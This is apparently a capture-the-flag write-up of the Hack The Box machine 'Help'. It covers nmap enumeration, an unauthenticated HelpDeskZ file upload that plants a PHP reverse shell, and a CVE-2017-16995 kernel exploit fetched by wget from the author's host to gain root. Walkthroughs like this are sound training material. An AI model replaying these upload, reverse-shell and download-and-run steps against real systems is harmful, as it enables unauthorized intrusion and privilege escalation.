# HELP
## Writeup

### Script Kiddie
I'm currently just at [script kiddie](https://www.hackthebox.eu/home/users/profile/48556) level on Hack the Box and am doing these write-ups to try and improve.  There will most definitely be better ways of doing the boxes than I outline here in my write-ups so I welcome any comments and tips.

### Enumeration
```
root@kali:~/htb/help# nmap -sC -sV -oA nmap/initial 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-22 15:56 UTC
Nmap scan report for 10.10.10.121
Host is up (0.056s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Kicking off with the nmap scan we see 3 services open.  SSH, HTTP and nodejs.  The -sV parameter also shows us version numbers that we can use to check for vulnerabilities.  I don't really know anything about nodejs so will leave that one till last and check the reported version of OpenSSH.

### SSH

```
root@kali:~# searchsploit OpenSSH 7.2p2
-------------------------------------------------- ----------------------------------------
 Exploit Title                                    |  Path
                                                  | (/usr/share/exploitdb/)
-------------------------------------------------- ----------------------------------------
OpenSSH 7.2p2 - Username Enumeration              | exploits/linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration             | exploits/linux/remote/40113.txt
-------------------------------------------------- ----------------------------------------
```

This version of OpenSSH appears vulnerable.  The weakness is that for some configurations, this SSH server will respond with a 'permission denied' error faster for an invalid user than it will for a legitimate one.  So you can try to attack the target machine with a user list and potentially enumerate some valid users for the machine.
I tried the above exploits from exploit-db.com a number of times without success but then found it was in metasploit and included a 'CHECK_FALSE' option which checks for false positives by sending a few completely random usernames.  This test proved that the exploit wasn't working, time to move on.

![alt text](https://github.com/imp0ster-net/htb/blob/master/help/img/00_help_msf-ssh-enumusers.png "nmap scan")

### HelpDeskZ

Opening the box in a browser shows a default install of apache 2 for Ubuntu.  There was nothing noticeable here of interest and no /robots.txt file so I ran dirbuster with the small directory list.

![alt text](https://github.com/imp0ster-net/htb/blob/master/help/img/01_help_dirbuster-settings.png "dirbuster settings")
![alt text](https://github.com/imp0ster-net/htb/blob/master/help/img/02_help_dirbuster-results.png "dirbuster results")

This quickly listed the /support directory which revealed the HelpDeskZ app, clearly the namesake of the box.

![alt text](https://github.com/imp0ster-net/htb/blob/master/help/img/03_help_helpdeskz-index.png "HelpDeskZ")

I played around with it for a little while to see if there was a way of injecting SQL or system commands into any of the input fields but I couldn't find any way of doing so.

I checked searchsploit again.

```
root@kali:~# searchsploit helpdeskz
---------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                          |  Path
                                                                                        | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------- ----------------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                 | exploits/php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download          | exploits/php/webapps/41200.py
---------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

There were two results, one with 'authorized' in the title which wouldn't help us right now and another one called 'Arbitrary File Upload'.

It turns out that HelpDeskZ allows you to upload PHP files using the support ticket page.  When you upload a PHP file it does tell you that this file type is not allowed, suggesting the upload failed.  However, it still saves the file on the server.  The software renames the file to an md5 hash of the filename and current time as you can see in the source code below.  This means that you can still access and so run the uploaded PHP file, if you can find out the new filename and where it is located.

The first time around I skim read the python script which states you just upload a PHP shell and run the script with the *base url* of the HelpDeskZ install and the name of your PHP shell.

I used this PHP reverse shell from pentestmonkey: *(http://pentestmonkey.net/tools/web-shells/php-reverse-shell)* and set up a netcat listener
```
root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/ rshell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
Sorry, I did not find anything
```
This didn't work so I read the script again and thought about why the current time part was so important.  If this was a key part of the exploit, what *is* the current time?
I reloaded the page in firefox and checked the response headers and saw that the time was behind mine but not by a round number of hours suggesting it wasn't just in a different time zone.
I went down a little rabbit hole and made a [python script](https://github.com/imp0ster-net/htb/blob/master/help/timesync.py) to sync my local system time with that of the webserver.

<pre>
root@kali:~/htb/help# python timesync.py
Original system date:
Wed 22 May <b><u>18:37:33</u></b> UTC 2019
HELP Datetime: 2019-05-22 <b><u>18:28:01</u></b>
new system date:
Wed 22 May <b><u>18:28:01</u></b> UTC 2019
</pre>

*[After changing the local system time, it would revert back within a few seconds, even after disabling any kind of NTP daemon and service I could find!  I finally tracked it down to the Guest Additions of VirtualBox being too 'helpful'. After disabling* `vboxadd-service` *the time change stuck.]*

After this the exploit still failed.

So I read the exploit script *again*.  In the description it has a link to the HelpDeskZ source code file that contains the vulnerability so I checked that out on [github](https://github.com/evolutionscript/HelpDeskZ-1.0) and here I found out the path that files are uploaded to; this needs to included in the first parameter of the exploit.

##### HelpDeskZ-1.0/controllers/submit_ticket_controller.php
*https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php*
<pre>
137   if(!isset($error_msg) && $settings['ticket_attachment']==1){
138     <em><b><u>$uploaddir = UPLOAD_DIR.'tickets/';</u></b></em>
139     if($_FILES['attachment']['error'] == 0){
140     $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
141     <em><b><u>$filename = md5($_FILES['attachment']['name'].time()).".".$ext;</u></b></em>
142     $fileuploaded[] = array('name' => $_FILES['attachment']['name'],
143     'enc' => $filename,
144     'size' => formatBytes($_FILES['attachment']['size']),
145     'filetype' => $_FILES['attachment']['type']);
146     $uploadedfile = $uploaddir.$filename;
</pre>__

##### HelpDeskZ-1.0/includes/global.php
*https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/global.php*
```
18   define('UPLOAD_DIR', ROOTPATH . 'uploads/');
```

So with the time on my machine in sync with HELP and the right path set I was ready to try again.
```
root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/uploads/tickets/ rshell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://10.10.10.121/support/uploads/tickets/fc7240781f3464afcebb47bd8da49b9a.php
```

Now I had a reverse shell through netcat from which I went straight for the user flag

![alt text](https://github.com/imp0ster-net/htb/blob/master/help/img/04_help_nc-shell.png "netcat shell")
![alt text](https://github.com/imp0ster-net/htb/blob/master/help/img/05_help_nc-commands.png "user flag")

### Escalate

Next up I needed to find a way to escalate my privileges in order to get the root flag, and ideally to the root account itself.

As you can see from the screenshot above, when the shell started it showed the kernel version of `4.4.0-116-generic`.  I figured this sounded old enough to run it through searchsploit.

```
root@kali:~/htb/help# searchsploit 4.4.0-116
---------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                |  Path
                                                                                              | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------- ----------------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                        | exploits/linux/local/44298.c
---------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
That'll do.

### [CVE-2017-16995](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16995)
#### Description
>The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.

I searched github for the CVE ID and found this code from [iBearcat](https://github.com/iBearcat/CVE-2017-16995/blob/master/exploit.c)
He includes instructions in his readme but its just a case of compiling the code on the target and running the resulting binary.

I started a simple HTTP server on my machine to serve up the exploit and got it from the target machine with the reverse shell that was already running.
`python3 -m http.server 6666`

```
help@help:/$ cd /tmp
cd /tmp
help@help:/tmp$ wget http://10.10.14.9:6666/exploit.c
wget http://10.10.14.9:6666/exploit.c
--2019-05-22 13:59:50--  http://10.10.14.9:6666/exploit.c
Connecting to 10.10.14.9:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5775 (5.6K) [text/plain]
Saving to: 'exploit.c'

exploit.c    100%[===================>]   5.64K  --.-KB/s    in 0.01s

2019-05-22 13:59:50 (509 KB/s) - 'exploit.c' saved [5775/5775]

help@help:/tmp$ gcc exploit.c -o makemeroot
gcc exploit.c -o makemeroot
help@help:/tmp$ chmod +x makemeroot
chmod +x makemeroot
help@help:/tmp$ ./makemeroot
./makemeroot
task_struct = ffff880010cbaa00
uidptr = ffff880036aef2c4
spawning root shell
root@help:/tmp# whoami
whoami
root
root@help:/tmp#
```

### root.txt

All that was left to do was to get the root flag.

```
root@help:/tmp# cd /root
cd /root
root@help:/root# ls
ls
root.txt
root@help:/root# cat root.txt
cat root.txt
b7fe608***************0d9daddb98
```

Thanks for reading and thanks to [cymtrick](https://www.hackthebox.eu/home/users/profile/3079) for creating the box.
Email: [htb -at- imp0ster.net]("mailto:htb@imp0ster.net")
